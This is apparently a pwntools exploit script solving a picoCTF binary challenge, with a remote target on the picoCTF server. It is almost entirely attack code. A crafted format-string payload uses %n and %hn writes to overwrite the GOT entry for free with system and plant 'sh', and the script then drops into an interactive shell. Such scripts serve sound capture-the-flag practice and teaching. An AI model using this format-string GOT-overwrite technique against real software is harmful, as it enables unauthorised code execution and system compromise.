from pwn import *

e = ELF("./vuln")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("mercury.picoctf.net", 12784)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

debug()

C = u32("sh\x00\x00")
A = e.got["free"]
B = e.symbols["system"]
mod = 0x10000

p.sendlineafter("do?", "1")
p.sendlineafter("token?", "%" + str(C - 5 * 0x10) + "llx" + "%16llx" * 5 + "%hn" + "%" + str(A - C - 3 * 0x10) + "llx" + "%16llx" * 3 + "%n" + "%" + str(mod + B - (A % mod)) + "x" + "%20$hn" + "!" * 8 + "%llx" * 8)
#p.sendlineafter("token?", "%" + str(A - 10 * 0x10) + "llx" + "%16llx" * 10 + "%n" + "%" + str(mod + B - (A % mod)) + "x" + "%20$hn" + "!" * 8 + "%llx" * 8)

p.recvuntil("!" * 8)
#+ "!!%" + "17$llx")

p.interactive()
